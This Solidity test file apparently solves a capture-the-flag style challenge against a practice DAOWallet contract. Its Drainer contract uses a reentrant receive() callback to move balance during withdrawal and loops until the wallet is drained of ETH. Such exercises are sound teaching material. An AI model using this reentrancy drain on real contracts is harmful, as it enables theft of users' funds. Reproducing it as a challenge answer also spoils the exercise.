// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

import {DAOWalletBaseTest} from "test/DAOWallet/DAOWalletBase.t.sol";
import {DAOWallet} from "src/DAOWallet/DAOWallet.sol";

contract DAOWalletTest is DAOWalletBaseTest {
    function testDAOWalletExploit() public checkSolved {
        // DO NOT use any cheat codes here.
        // @todo drain all ETH from DAOWallet contract
        Drainer drainer = new Drainer(daoWallet);
        
        while (daoWallet.userBalance(address(player)) != 102 ether) {
            drainer.start{value: player.balance}();
        }        

        daoWallet.withdraw();
    }
}

contract Drainer {
    DAOWallet daoWallet;
    address player;

    constructor(DAOWallet _daoWallet) {
        daoWallet = _daoWallet;
        player = msg.sender;
    }

    function start() public payable {
        daoWallet.deposit{value: msg.value}();
        daoWallet.withdraw();
    }

    receive() external payable {
        payable(player).transfer(msg.value);
        uint256 balance = daoWallet.userBalance(address(this));
        daoWallet.transfer(player, balance);
    }
}